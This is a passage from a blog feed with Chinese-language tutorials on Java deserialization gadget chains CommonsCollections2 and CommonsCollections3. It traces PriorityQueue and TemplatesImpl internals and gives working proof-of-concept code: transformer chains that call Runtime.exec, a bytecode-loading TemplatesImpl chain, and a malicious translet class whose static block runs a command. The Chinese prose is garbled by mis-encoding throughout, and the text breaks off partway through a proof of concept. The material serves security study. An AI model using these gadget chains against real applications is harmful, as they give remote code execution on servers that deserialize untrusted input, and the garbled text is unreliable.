class="hljs-params"><span class="hljs-function">                         Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>        <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>        <span class="hljs-keyword">this</span>.comparator = comparator;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        queue = <span class="hljs-keyword">new</span> Object[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<span class="hljs-comment">// è¿™é‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<span class="hljs-comment">// éœ€è¦æ»¡è¶³sizeå³ç§»1ä½å†å‡1åè¿˜å¤§äº0ï¼Œä¹Ÿå°±æ˜¯sizeæœ€å°ä¸º2</span><br>            siftDown(i, (E) queue[i]);<span class="hljs-comment">// ç»§ç»­è·Ÿè¿›siftDown</span><br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<span class="hljs-comment">// comparatorä¸ä¸ºç©ºæ—¶</span><br>            siftDownUsingComparator(k, x);<span class="hljs-comment">// è·Ÿè¿›</span><br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<span class="hljs-comment">// éœ€è¦å…ˆæ»¡è¶³right&lt;sizeï¼Œæ‡’å¾—æäº†ï¼Œç›´æ¥èµ°ä¸‹é¢çš„é‚£ä¸ªifå°±å¯ä»¥äº†</span><br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<span class="hljs-comment">// åœ¨ifé‡Œè°ƒç”¨äº†è¿™ä¸ªcompare</span><br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<span class="hljs-comment">// è¿™é‡Œä¹Ÿè°ƒç”¨äº†</span><br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚çš„æµç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/2022/10/15/CommonsCollections2/4.png"></p><p>æ¥ä¸‹æ¥åªéœ€è¦ä¸€æ­¥æ­¥æ»¡è¶³å°±å¯ä»¥äº†</p><p>å…ˆæ¥çœ‹ä¸€ä¸‹èµ‹å€¼ï¼Œè·Ÿæˆ‘è¿™ä¸ªèœé¸¡æƒ³çš„ä¸€æ ·ä¸€ä¸ä¸€æ ·</p><p><img src="/2022/10/15/CommonsCollections2/5.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ»¡è¶³ä¸€äº›ifé‡Œé¢çš„å¾ªç¯äº†ï¼Œè®¾ç½®ä¸€ä¸‹sizeä¸º2</p><p><img src="/2022/10/15/CommonsCollections2/6.png"></p><p>sizeè®¾ç½®ä¸º2å°±å¯ä»¥æ­£å¸¸è¿›äº†ï¼Œå¤ªå¤§äº†çš„è¯ï¼Œæœ‰ä¸ªå¾ªç¯è¦èµ°å¥½å¤šæ¬¡ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŠŠPOCæ‹¼æ¥åœ¨ä¸€èµ·å°±å¯ä»¥äº†</p><h3 id="0x03-POC"><a href="#0x03-POC" class="headerlink" title="0x03 POC"></a>0x03 POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>    Transformer&lt;Object,Object&gt;[] transformer = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer&lt;Object,Object&gt;(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;Runtime.class,<span class="hljs-keyword">null</span>&#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>    &#125;;<br><br>    ChainedTransformer&lt;Object&gt; chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer&lt;&gt;(transformer);<br><br>    TransformingComparator&lt;Object, Object&gt; transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator&lt;&gt;(chainedTransformer);<br><br>    PriorityQueue&lt;Object&gt; objects = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);<br><br>    Class&lt;? extends PriorityQueue&gt; c = objects.getClass();<br>    Field size = c.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(objects,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-comment">//        serialize(objects);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/15/CommonsCollections2/7.png"></p><p>æœ€ç»ˆä¼šæ‰§è¡Œä¸¤æ¬¡å‘½ä»¤ï¼Œè¿™æ˜¯å› ä¸ºåœ¨<code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code>å¤„ï¼Œè°ƒç”¨äº†ä¸¤æ¬¡<code>this.transformer.transform()</code></p><p>è¡¥å……ä½¿ç”¨ç±»åŠ è½½çš„POCï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å¤åˆ¶ç²˜è´´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(templates),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>)<br>    &#125;;<br><br>    ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br>    TransformingComparator&lt;Object, Object&gt; transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator&lt;&gt;(chainedTransformer);<br><br>    PriorityQueue&lt;Object&gt; objects = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(transformingComparator);<br><br>    Class&lt;? extends PriorityQueue&gt; c = objects.getClass();<br>    Field size = c.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(objects,<span class="hljs-number">2</span>);<br><br><span class="hljs-comment">//        serialize(objects);</span><br>    deserialize();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/15/CommonsCollections2/9.png"></p><h3 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h3><p>å†æ¥çœ‹ä¸€ä¸‹æ‰€æœ‰çš„é“¾å›¾</p><p><img src="/2022/10/15/CommonsCollections2/8.png"></p><p>æ–°çš„è¿™æ¡é“¾å¥½åƒæ˜¯æ¥æºè‡ªCommonsCollections4.0ç‰ˆæœ¬çš„ï¼Œä½†å®é™…ä¸ŠCommonsCollections3.xç‰ˆæœ¬çš„ä¸€äº›é“¾ä»ç„¶å¯ä»¥ç”¨ï¼Œæ‰€ä»¥ï¼Œè°ƒç”¨é“¾ä¸å¯ä»¥ç›²ç›®åªçœ‹ä¸€ç§ï¼Œæ³¨æ„å„ä¸ªè°ƒç”¨é“¾çš„æ‹¼æ¥ä½¿ç”¨ï¼Œåæ­£æœ€ç»ˆçš„ç›®çš„æ˜¯æ‰§è¡Œå‘½ä»¤ï¼Œå’‹èµ°éƒ½æ— æ‰€è°“ï¼Œæ­£æ‰€è°“æ¡æ¡å¤§è·¯é€šç½—é©¬ï¼Œä½•å¿…çº ç»“èµ°å“ªå‘¢ï¼Œä½†è¿˜æ˜¯å°½é‡è¦èµ°ç®€å•ç‚¹</p><p>åœ¨CommonsCollections4.1ç‰ˆæœ¬æ—¶ï¼Œ<code>InvokerTransformer</code>è¢«ä¿®æ”¹äº†ï¼Œæ²¡æœ‰å†ç»§æ‰¿<code>Serializable</code>æ¥å£ï¼Œæ— æ³•å†ä½¿ç”¨<code>InvokerTransformer</code>ï¼Œå°±éœ€è¦æ‰¾ä¸ªæ–°ä¸œè¥¿äº†</p><h3 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java">ysoserial_CommonsCollections2</a></li><li><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">Javaååºåˆ—åŒ–CommonsCollectionsç¯‡(å››)-æ‘†çƒ‚çš„å®Œç»“ç¯‡</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections3</title>
    <link href="/2022/10/08/CommonsCollections3/"/>
    <url>/2022/10/08/CommonsCollections3/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>CC1ã€CC6éƒ½æ˜¯æœ€ç»ˆèµ°åˆ°<code>Runtime.getRuntime().exec()</code>ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œè¿™æ¬¡æ¥çœ‹ä¸€ä¸ªä¸ä¸€æ ·ï¼Œå·²ç»å­¦è¿‡äº†ç±»åŠ è½½ï¼Œé‚£å°±æ¥çœ‹ä¸€ä¸‹åŠ¨æ€ç±»åŠ è½½</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><ul><li>jdk8u65</li><li>CommonsCollections3.2.1</li></ul><h3 id="0x01-å±é™©æ–¹æ³•"><a href="#0x01-å±é™©æ–¹æ³•" class="headerlink" title="0x01 å±é™©æ–¹æ³•"></a>0x01 å±é™©æ–¹æ³•</h3><p>åœ¨ç±»åŠ è½½éƒ¨åˆ†ï¼Œå·²çŸ¥äº†æœ€ç»ˆå®ç°ç±»åŠ è½½çš„æ˜¯<code>ClassLoader#defineClass()</code>ï¼Œå½“ç„¶è¿™é‡Œéœ€è¦è¿›è¡Œåˆå§‹åŒ–<code>newInstance</code>,åˆå§‹åŒ–çš„æ—¶å€™æ‰èƒ½å¤Ÿæ‰§è¡Œé™æ€ä»£ç ï¼Œç„¶åå¼€æ‰¾ï¼Œæ‰¾çš„æ—¶å€™æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>å°½é‡JDKè‡ªå¸¦</li><li>å°½é‡Public</li><li>å°½é‡éåŒåå‡½æ•°ï¼Œä¸”å‡½æ•°åç§°è¾ƒä¸ºæ™®é</li></ul><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass</code></p><p><img src="/2022/10/08/CommonsCollections3/1.png"></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#defineTransletClasses</code></p><p><img src="/2022/10/08/CommonsCollections3/2.png"></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå·²çŸ¥<code>ClassLoader.defineClass()</code>å¹¶ä¸ä¼šåˆå§‹åŒ–ç±»ï¼Œæ‰€ä»¥è¿˜éœ€è¦æ‰¾ä¸€ä¸‹å¸¦æœ‰<code>newInstance</code>çš„åœ°æ–¹</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstance</code>ï¼Œä¸‰ä¸ªç»“æœä¸­ï¼Œå”¯æœ‰è¿™ä¸ªå¸¦æœ‰<code>newInstance</code>ï¼Œæ‰€ä»¥åªèƒ½é€‰ä»–</p><p><img src="/2022/10/08/CommonsCollections3/3.png"></p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</code></p><p>æ‰¾åˆ°ä¸€ä¸ªpublicä¿®é¥°çš„æ–¹æ³•</p><p><img src="/2022/10/08/CommonsCollections3/4.png"></p><p>å†æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªç±»<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p>publicä¿®é¥°ï¼Œå¹¶ä¸”å®ç°äº†Serializableæ¥å£ï¼Œæ¥ä¸‹æ¥åªéœ€è¦å®ç°è¯¥ç±»ï¼Œå¹¶ä¸”æˆåŠŸèµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„<code>defineClass</code>å°±å¯ä»¥äº†</p><p><img src="/2022/10/08/CommonsCollections3/5.png"></p><p>å¤§æ¦‚çš„æµç¨‹å°±æ˜¯ä¸‹é¢çš„è¿™ä¸ªæ ·å­</p><p><img src="/2022/10/08/CommonsCollections3/6.png"></p><h3 id="0x02-TemplatesImpl"><a href="#0x02-TemplatesImpl" class="headerlink" title="0x02 TemplatesImpl"></a>0x02 TemplatesImpl</h3><p>ä¸€ç§ä¸‰ä¸ªæ„é€ å™¨ï¼Œä¸¤ä¸ªå—ä¿æŠ¤çš„ï¼Œé‚£è‚¯å®šé€‰publicçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">()</span> </span>&#123; &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[][] bytecodes, String transletName,</span></span><br><span class="hljs-params"><span class="hljs-function">                        Properties outputProperties, <span class="hljs-keyword">int</span> indentNumber,</span></span><br><span class="hljs-params"><span class="hljs-function">                        TransformerFactoryImpl tfactory)</span></span><br><span class="hljs-function"></span>&#123;<br>    _bytecodes = bytecodes;<br>    init(transletName, outputProperties, indentNumber, tfactory);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TemplatesImpl</span><span class="hljs-params">(Class[] transletClasses, String transletName,</span></span><br><span class="hljs-params"><span class="hljs-function">                        Properties outputProperties, <span class="hljs-keyword">int</span> indentNumber,</span></span><br><span class="hljs-params"><span class="hljs-function">                        TransformerFactoryImpl tfactory)</span></span><br><span class="hljs-function"></span>&#123;<br>    _class     = transletClasses;<br>    _transletIndex = <span class="hljs-number">0</span>;<br>    init(transletName, outputProperties, indentNumber, tfactory);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†åœ¨æ•´ä¸ªæµç¨‹ä¸­ï¼Œèƒ½å¤Ÿå‘ç°è¯¥ç±»çš„ä¸€äº›å±æ€§éƒ½æ˜¯éœ€è¦æœ‰ä¸€å®šçš„å€¼ï¼Œæ‰€ä»¥å…ˆæ¥çœ‹ä¸€ä¸‹è¯¥ç±»å’Œå…¶ä¸­çš„ä¸€äº›å±æ€§ï¼›</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> æ˜¯ä¸€ä¸ª Java ç±»ï¼Œå®ƒæ˜¯ XSLT ç¼–è¯‘å™¨çš„ä¸€ä¸ªå®ç°ï¼Œç”¨äºå°† XSLT æ–‡ä»¶ç¼–è¯‘æˆå¯æ‰§è¡Œçš„æ¨¡æ¿ã€‚è¯¥ç±»æ˜¯ç”± Apache Xalan å’Œ Sun å…¬å¸å…±åŒå¼€å‘çš„ï¼Œå®ƒå®ç°äº† <code>javax.xml.transform.Templates</code> æ¥å£ã€‚</p><ul><li><p><code>_bytecodes</code>ï¼šå­˜å‚¨è¯¥æ¨¡æ¿çš„ç¼–è¯‘åå­—èŠ‚ç çš„å­—èŠ‚æ•°ç»„ã€‚åœ¨è¿™é‡Œå…¶å®å°±æ˜¯å±é™©ç±»çš„classæ–‡ä»¶çš„å­—èŠ‚æ•°ç»„</p></li><li><p><code>_name</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿çš„åç§°ã€‚</p></li><li><p><code>_outputProperties</code>ï¼šåŒ…å«è¯¥æ¨¡æ¿çš„è¾“å‡ºå±æ€§çš„ <code>Properties</code> å¯¹è±¡ã€‚</p></li><li><p><code>_indentNumber</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿çš„è¾“å‡ºç¼©è¿›é‡ã€‚</p></li><li><p><code>_transletIndex</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿åœ¨æ‰€æœ‰ç¼–è¯‘åçš„æ¨¡æ¿ä¸­çš„ç´¢å¼•ä½ç½®ã€‚</p></li><li><p><code>_transletVersion</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿çš„è½¬æ¢ç‰ˆæœ¬ã€‚</p></li><li><p><code>_hasIdCall</code>ï¼šæŒ‡ç¤ºè¯¥æ¨¡æ¿æ˜¯å¦åŒ…å« ID è°ƒç”¨ã€‚</p></li><li><p><code>_auxClasses</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿æ‰€éœ€çš„è¾…åŠ©ç±»çš„æ•°ç»„ã€‚</p></li><li><p><code>_class</code>ï¼šè¡¨ç¤ºè¯¥æ¨¡æ¿çš„ç±»å¯¹è±¡ã€‚</p></li><li><p><code>_uriResolver</code>ï¼šç”¨äºè§£æ URI çš„ <code>URIResolver</code> å¯¹è±¡ã€‚</p></li><li><p><code>_tfactory</code>ï¼šç”¨äºåˆ›å»º <code>TransformerHandler</code> å®ä¾‹çš„ <code>TransformerFactoryImpl</code> å¯¹è±¡ã€‚è¯¥å±æ€§è¢«<code>transient</code>ä¿®é¥°ï¼Œè¡¨ç¤ºä¸å¯åºåˆ—åŒ–ï¼Œä½†å®ƒåœ¨readObject()ä¸­è¿›è¡Œäº†èµ‹å€¼ï¼Œæ‰€ä»¥å‡ ä¹æ²¡æœ‰å½±å“ï¼Œåªä¸è¿‡åœ¨æµ‹è¯•æ—¶éœ€è¦è¿›è¡Œèµ‹å€¼</p><p><img src="/2022/10/08/CommonsCollections3/7.png"></p></li></ul><h3 id="0x03-è°ƒè¯•"><a href="#0x03-è°ƒè¯•" class="headerlink" title="0x03 è°ƒè¯•"></a>0x03 è°ƒè¯•</h3><p>å…ˆç»™ä¸€äº›èƒ½å¤Ÿçœ‹è§çš„å€¼è¿›è¡Œèµ‹å€¼ï¼Œä¾‹å¦‚<code>_bytecodes</code>ã€<code>_name</code>ã€<code>_tfactory</code>ï¼Œä½¿ç”¨åå°„è¿›è¡Œèµ‹å€¼ï¼Œå› ä¸ºè¿™äº›å˜é‡éƒ½æ˜¯épublicçš„</p><p><img src="/2022/10/08/CommonsCollections3/8.png"></p><p><img src="/2022/10/08/CommonsCollections3/9.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String ABSTRACT_TRANSLET<br>    = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæ­¤æ—¶åº”è¯¥æ”¹ä¸€æ”¹å±é™©ç±»ï¼Œç¼–è¯‘ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cattle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">com</span>.<span class="hljs-title">sun</span>.<span class="hljs-title">org</span>.<span class="hljs-title">apache</span>.<span class="hljs-title">xalan</span>.<span class="hljs-title">internal</span>.<span class="hljs-title">xsltc</span>.<span class="hljs-title">runtime</span>.<span class="hljs-title">AbstractTranslet</span></span>&#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException </span>&#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/10/08/CommonsCollections3/10.png"></p><p>è¿™ä¸ªç‚¹å°±å¯ä»¥äº†</p><h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p>æ‰§è¡Œçš„ä»£ç éƒ¨åˆ†å·²ç»å®Œå·¥äº†ï¼Œæ¥ä¸‹æ¥åªéœ€è¦åœ¨ä½¿ç”¨InvokerTransformerå»è°ƒç”¨é‚£ä¸ªæ–¹æ³•å°±å¯ä»¥äº†ï¼Œå¯ä»¥ç›´æ¥æ‹¼æ¥CC1çš„éƒ¨åˆ†</p><p>æ­¤å¤„ä½¿ç”¨jdk8u65</p><p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¦æ”¹ä¸€ä¸‹<code>ChainedTransformer</code></p><p>æœ€ç»ˆPOCå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC3Test</span> </span>&#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> String path = <span class="hljs-string">&quot;ser.bin&quot;</span>;<br><br>    